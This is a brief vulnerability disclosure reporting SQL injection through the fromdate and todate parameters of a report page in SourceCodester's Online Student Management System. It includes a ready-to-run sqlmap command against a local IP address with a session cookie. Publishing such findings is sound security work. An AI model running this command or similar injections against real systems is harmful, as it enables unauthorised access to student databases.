vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $fromdate,$todate

The process of vulnerability discovery is as follows：

![image-20230223155745422](C:\markdown\images\image-20230223155745422.png)

exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/between-date-reprtsdetails.php" --data "fromdate=1&todate=1" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```

![image-20230223155540814](C:\markdown\images\image-20230223155540814.png)